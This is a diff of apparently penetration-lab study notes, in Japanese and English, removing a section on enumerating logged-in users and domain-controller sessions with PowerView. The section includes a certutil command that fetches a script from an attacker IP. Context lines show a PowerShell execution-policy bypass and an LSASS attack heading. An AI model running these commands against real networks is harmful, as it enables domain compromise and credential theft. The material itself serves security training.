@@ -58,33 +58,6 @@ PS> . .\PowerView.ps1
 
 ```PS > powershell -ep bypass .\enum_users.ps1```
 
-# Curret Logged In Users And Active Sessions
-
-> NetWkstaUserEnum API を使用して Windows 10 クライアントマシン上のローカルユーザを列挙し、NetSessionEnum を使用し てドメインコントローラ上のユーザのアクティブセッションを列挙します。
-
-(certutil -URLcache -f http://192.168.119.160/PowerView.ps1 PowerView.ps1)
-
-## Show Current Logged In Users
-
-まず、Get-NetLoggedon でログインユーザを列挙する際に、対象となるワークステーショ ンやサーバを指定するために-ComputerName オプションを使います。ここでは Windows 10 クライアントを対象としているので、-ComputerName client251 とします。
-
-(Computer name "client251", `hostname` command tells you your computer name)
-
-```PS> Get-NetLoggedon -ComputerName client251```
-
-## Show All Activated Sessions
-
-ドメインコントローラ DC01 上のアクティブなセッションを取得してみましょう。
-
-```PS> Get-NetSession -ComputerName dc01```
-
- (Probably, dc01 is Doamin Controller (it's ok not to specify "dc01"))
-
-（Domain Admins の一人を侵害することに成功すれば、最終的にはドメイン全体を乗っ取ることができます)
-
-> グループメンバーシップを列挙し、ユーザが現在ログインしているマシンを特定できるよ うになったので、ユーザアカウント侵害を開始するために必要な基本スキルを身につける ことができました。最終目的はドメイン管理者権限の獲得です。
-
-
 # LSASS Attack (Local Security Authority Subsystem Service)
 
 （Microsoft の Kerberos の実装ではシングルサインオンを採用しているため、TGT 要求を更新するためにパスワードハッシュをどこかに保存しておく必要がある）
